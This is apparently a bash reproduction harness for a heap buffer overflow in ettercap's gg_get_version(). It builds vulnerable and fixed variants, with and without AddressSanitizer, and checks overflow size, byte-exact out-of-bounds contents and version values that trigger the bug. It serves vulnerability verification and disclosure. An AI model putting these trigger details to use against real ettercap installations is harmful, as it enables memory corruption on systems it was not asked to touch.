#!/bin/bash
# CVE-2026-125401 / GHSA-vrjv-f8gv-2h35 — ettercap gg_get_version() heap
# overflow. Direct-call harness: verbatim pinned helper slices, 30-byte caller
# object, plain/ASan builds. No ettercap build, no dissector loop, no listener,
# no network, no off-loopback probe.
set -u
cd "$(dirname "$0")" || exit 99
E=evidence
mkdir -p "$E" vuln fixed
rm -f "$E"/*.out "$E"/*.log "$E"/normalized.txt \
      vuln/*.inc fixed/*.inc p-vuln p-fixed a-vuln-gcc a-vuln-clang a-fixed-gcc
PASS=0
FAIL=0

ok() { PASS=$((PASS + 1)); printf 'PASS %s\n' "$1"; }
no() { FAIL=$((FAIL + 1)); printf 'FAIL %s\n' "$1"; }
has() {
    if grep -qF "$2" "$1" 2>/dev/null; then ok "$3"; else no "$3"; fi
}
hasnt() {
    if grep -qF "$2" "$1" 2>/dev/null; then no "$3"; else ok "$3"; fi
}
srcsha() { sha256sum "$1" | cut -d' ' -f1; }

# --- pinned bytes -----------------------------------------------------------
[ "$(srcsha ../src/ec_gg.c.3548c10)" = \
  1369e5c88fec9243ea842a9227d36718d5fd30294a81d54ea0cc9c246c9cd34a ] \
  && ok "pin-vuln-ec_gg-c-3548c10-sha256" || no "pin-vuln-ec_gg-c-3548c10-sha256"
[ "$(srcsha ../src/ec_gg.c.a8c1a50)" = \
  a516ce050828f2c2abec17be35b1b87cea4d2b5c60484c073161d6e8a1fcce8d ] \
  && ok "pin-fixed-ec_gg-c-a8c1a50-sha256" || no "pin-fixed-ec_gg-c-a8c1a50-sha256"
[ "$(srcsha ../src/fix-pr1330.patch)" = \
  4ab380d9fa46bde9052542f76e1fd70c13889da63bda1729fbe965916d58ee5c ] \
  && ok "pin-fix-pr1330-patch-sha256" || no "pin-fix-pr1330-patch-sha256"
[ "$(srcsha ../src/ec_gg.c.v0.8.4.1)" = \
  a97a0984f9c9b62910f3259715287b42cff8dff87115913001f687f0a05189d8 ] \
  && ok "pin-v0.8.4.1-tag-sha256" || no "pin-v0.8.4.1-tag-sha256"
[ "$(srcsha ../src/ec_gg.c.1d8badb7)" = \
  a516ce050828f2c2abec17be35b1b87cea4d2b5c60484c073161d6e8a1fcce8d ] \
  && ok "pin-merged-fix-sha256" || no "pin-merged-fix-sha256"
[ "$(srcsha ../src/ec_gg.c.v0.8.5.1)" = \
  a516ce050828f2c2abec17be35b1b87cea4d2b5c60484c073161d6e8a1fcce8d ] \
  && ok "pin-v0.8.5.1-tag-sha256" || no "pin-v0.8.5.1-tag-sha256"
if (cd ../src && sha256sum -c --status SHA256SUMS); then \
  ok "all-pinned-blobs-match-sha256sums"; else no "all-pinned-blobs-match-sha256sums"; fi
[ "$(sed -n '599,678p' ../src/ec_gg.c.v0.8.4.1 | sha256sum | cut -d' ' -f1)" = \
  "$(sed -n '616,695p' ../src/ec_gg.c.3548c10 | sha256sum | cut -d' ' -f1)" ] \
  && ok "release-tag-helper-is-pinned-helper" || no "release-tag-helper-is-pinned-helper"
[ "$(srcsha driver.c)" = \
  637316349cc776d8deee878d60d93da75a57812ac90508ce3fb2463b0c152bb1 ] \
  && ok "driver-sha256" || no "driver-sha256"

# --- verbatim slices: re-extracted from pinned source on every run ----------
{ echo '#line 616 "ec_gg.c.3548c10"'
  sed -n '616,695p' ../src/ec_gg.c.3548c10; } > vuln/gg_get_version.inc
{ echo '#line 631 "ec_gg.c.a8c1a50"'
  sed -n '631,717p' ../src/ec_gg.c.a8c1a50; } > fixed/gg_get_version.inc

[ "$(srcsha vuln/gg_get_version.inc)" = \
  6a46335a52b6540633a6a47d073d7b2ede3a66f5f99b10884ea3c8044413caa3 ] \
  && ok "verbatim-vuln-helper-sha256" || no "verbatim-vuln-helper-sha256"
[ "$(srcsha fixed/gg_get_version.inc)" = \
  a5e146f5fa90df2b3000715be3060fdb6f52ad7ca3c60acda74045103ed48021 ] \
  && ok "verbatim-fixed-helper-sha256" || no "verbatim-fixed-helper-sha256"
[ "$(grep -cF 'SAFE_CALLOC(tbuf3, 30, sizeof(char));' ../src/ec_gg.c.3548c10)" = 1 ] \
  && ok "caller-alloc-is-30" || no "caller-alloc-is-30"
[ "$(grep -cF 'gg_get_version(gg_login50->version,tbuf3);' ../src/ec_gg.c.3548c10)" = 1 ] \
  && ok "caller-reaches-vuln-helper" || no "caller-reaches-vuln-helper"
[ "$(grep -cF 'snprintf(str, size, "%s", buf);' ../src/fix-pr1330.patch)" = 2 ] \
  && ok "patch-adds-bounded-copy" || no "patch-adds-bounded-copy"
[ "$(grep -cF 'GHSA-vrjv-f8gv-2h35' ../src/fix-pr1330.patch)" -ge 2 ] \
  && ok "patch-cites-ghsa" || no "patch-cites-ghsa"

# --- build ------------------------------------------------------------------
cc -O0 -g -std=gnu11 -o p-vuln driver.c 2> "$E/build-p-vuln.log" \
  && ok "build-plain-vuln" || no "build-plain-vuln"
cc -O0 -g -std=gnu11 -DFIXED_VARIANT -o p-fixed driver.c 2> "$E/build-p-fixed.log" \
  && ok "build-plain-fixed" || no "build-plain-fixed"
cc -O0 -g -std=gnu11 -fsanitize=address -o a-vuln-gcc driver.c \
  2> "$E/build-a-vuln-gcc.log" && ok "build-asan-gcc-vuln" || no "build-asan-gcc-vuln"
if command -v clang >/dev/null 2>&1; then
    clang -O0 -g -std=gnu11 -fsanitize=address -o a-vuln-clang driver.c \
      2> "$E/build-a-vuln-clang.log" && ok "build-asan-clang-vuln" || no "build-asan-clang-vuln"
else
    printf 'PASS build-asan-clang-vuln (clang absent, SKIPPED)\n'
    PASS=$((PASS + 1))
fi
cc -O0 -g -std=gnu11 -DFIXED_VARIANT -fsanitize=address -o a-fixed-gcc driver.c \
  2> "$E/build-a-fixed-gcc.log" && ok "build-asan-gcc-fixed" || no "build-asan-gcc-fixed"

# --- rung 1: advisory arithmetic, independently computed by the driver ------
./p-vuln arith 44000042 30 > "$E/arith-vuln.out" 2>&1
has "$E/arith-vuln.out" 'ADVISORY_STR_LEN=43' 'r1-default-strlen-43'
has "$E/arith-vuln.out" 'ADVISORY_TOTAL_WITH_NUL=44' 'r1-default-with-nul-44'
has "$E/arith-vuln.out" 'CALLER_ALLOC=30' 'r1-caller-alloc-30'
has "$E/arith-vuln.out" 'ADVISORY_OVERFLOW=14' 'r1-overflow-14'
has "$E/arith-vuln.out" 'ACTUAL_STR_LEN=43' 'r1-helper-actual-43'
has "$E/arith-vuln.out" 'MATCH_ADVISORY=1' 'r1-actual-matches-advisory'
./p-vuln arith 44000018 30 > "$E/arith-short.out" 2>&1
has "$E/arith-short.out" 'ADVISORY_STR_LEN=30' 'r1-short-case-strlen-30'
has "$E/arith-short.out" 'ADVISORY_OVERFLOW=1' 'r1-short-case-overflow-1'
has "$E/arith-short.out" 'MATCH_ADVISORY=1' 'r1-short-actual-matches-advisory'
./p-vuln arith 04000042 30 > "$E/arith-era.out" 2>&1
has "$E/arith-era.out" 'ADVISORY_OVERFLOW=1' 'r1-era-only-overflow-1'
has "$E/arith-era.out" 'MATCH_ADVISORY=1' 'r1-era-actual-matches-advisory'
./p-vuln arith 0000002a 30 > "$E/arith-safe.out" 2>&1
has "$E/arith-safe.out" 'ADVISORY_OVERFLOW=0' 'r1-safe-case-in-bounds'

# --- rung 2 + scoped rung 4: byte-exact OOB tail controlled by input bits --
./p-vuln plain 44000042 30 > "$E/plain-vuln-default.out" 2>&1
has "$E/plain-vuln-default.out" 'STR_LEN=43' 'r2-plain-strlen-43'
has "$E/plain-vuln-default.out" 'OOB_COUNT=14' 'r2-plain-oob-14'
has "$E/plain-vuln-default.out" 'OOB_BYTES=696f202b206572616f6d6e697800' 'r4-default-oob-tail-byte-exact'
has "$E/plain-vuln-default.out" 'CANARY_AFTER_NUL=ee' 'r2-write-stops-at-nul'
has "$E/plain-vuln-default.out" 'HEX_DIGITS_OFFSET_11_18=3434303030303432' 'r4-chosen-hex-digits-offset-11-18'
./p-vuln plain 5a000042 30 > "$E/plain-vuln-5a.out" 2>&1
has "$E/plain-vuln-5a.out" 'HEX_DIGITS_OFFSET_11_18=3541303030303432' 'r4-chosen-5a-hex-in-buffer'
./p-vuln plain 44000018 30 > "$E/plain-vuln-short.out" 2>&1
has "$E/plain-vuln-short.out" 'OOB_COUNT=1' 'r4-two-flags-oob-1'
has "$E/plain-vuln-short.out" 'OOB_BYTES=00' 'r4-two-flags-oob-nul-byte-exact'
./p-vuln plain 04000042 30 > "$E/plain-vuln-eraomnix.out" 2>&1
has "$E/plain-vuln-eraomnix.out" 'OOB_COUNT=1' 'r4-era-only-oob-1'
has "$E/plain-vuln-eraomnix.out" 'OOB_BYTES=00' 'r4-era-only-oob-nul-byte-exact'

# --- rung 3: ASan WRITE past the 30-byte caller object -----------------------
./a-vuln-gcc asan 44000042 30 > "$E/vuln-gcc-asan.out" 2>&1
has "$E/vuln-gcc-asan.out" 'ERROR: AddressSanitizer: heap-buffer-overflow' 'r3-gcc-asan-overflow'
has "$E/vuln-gcc-asan.out" 'WRITE of size 13' 'r3-gcc-asan-write13'
has "$E/vuln-gcc-asan.out" '0 bytes after 30-byte region' 'r3-gcc-asan-at-30-byte-end'
has "$E/vuln-gcc-asan.out" 'in gg_get_version' 'r3-gcc-asan-vulnerable-frame'
if [ -x a-vuln-clang ]; then
    ./a-vuln-clang asan 44000042 30 > "$E/vuln-clang-asan.out" 2>&1
    has "$E/vuln-clang-asan.out" 'ERROR: AddressSanitizer: heap-buffer-overflow' 'r3-clang-asan-overflow'
    has "$E/vuln-clang-asan.out" 'WRITE of size 13' 'r3-clang-asan-write13'
    has "$E/vuln-clang-asan.out" '0 bytes after 30-byte region' 'r3-clang-asan-at-30-byte-end'
fi

# --- fixed control: bounded copy into the same 30-byte object ----------------
./p-fixed plain 44000042 30 > "$E/fixed-plain.out" 2>&1
has "$E/fixed-plain.out" 'STR_LEN=29' 'fixed-truncates-to-29'
has "$E/fixed-plain.out" 'OOB_COUNT=0' 'fixed-no-oob'
./p-fixed plain 44000042 64 > "$E/fixed-plain-64.out" 2>&1
has "$E/fixed-plain-64.out" 'STR_LEN=43' 'fixed-full-string-in-64'
has "$E/fixed-plain-64.out" 'OOB_COUNT=0' 'fixed-64-no-oob'
./a-fixed-gcc asan 44000042 30 > "$E/fixed-gcc-asan.out" 2>&1
hasnt "$E/fixed-gcc-asan.out" 'ERROR: AddressSanitizer' 'fixed-asan-clean'
has "$E/fixed-gcc-asan.out" 'STR_LEN=29' 'fixed-asan-truncates'

# --- safe control: known-case version stays in bounds on vulnerable helper --
./p-vuln plain 0000002a 30 > "$E/vuln-safe.out" 2>&1
has "$E/vuln-safe.out" 'STR_LEN=3' 'safe-vuln-strlen-3'
has "$E/vuln-safe.out" 'OOB_COUNT=0' 'safe-vuln-no-oob'
./a-vuln-gcc asan 0000002a 30 > "$E/vuln-gcc-asan-safe.out" 2>&1
hasnt "$E/vuln-gcc-asan-safe.out" 'ERROR: AddressSanitizer' 'safe-asan-clean'

# --- deterministic normalized trace: no PID, address, path or frame number --
{
    cat "$E/arith-vuln.out" "$E/arith-short.out" "$E/arith-era.out" \
        "$E/arith-safe.out" "$E/plain-vuln-default.out" "$E/plain-vuln-5a.out" \
        "$E/plain-vuln-short.out" "$E/plain-vuln-eraomnix.out" \
        "$E/fixed-plain.out" "$E/fixed-plain-64.out" "$E/vuln-safe.out"
    grep -E 'ERROR: AddressSanitizer|WRITE of size|bytes after|in gg_get_version|^CALL_BUFSZ=|^VERSION_HEX=' \
        "$E/vuln-gcc-asan.out" "$E/vuln-clang-asan.out" \
        "$E/fixed-gcc-asan.out" "$E/vuln-gcc-asan-safe.out"
} | sed -E 's#/[^ ]*/lab/frontier#lab/frontier#g; s/0x[0-9a-f]+/0xADDR/g; s/#[0-9]+ /#FRAME /g; s/==[0-9]+==/==PID==/g; s#in gg_get_version [^ ]+#in gg_get_version SOURCE#g; s#SUMMARY: AddressSanitizer: heap-buffer-overflow [^ ]+#SUMMARY: AddressSanitizer: heap-buffer-overflow SOURCE#g' > "$E/normalized.txt"
TRACE=$(srcsha "$E/normalized.txt")
printf 'TRACE_SHA256=%s\n' "$TRACE"

printf 'PASS=%d FAIL=%d\n' "$PASS" "$FAIL"
[ "$FAIL" -eq 0 ]
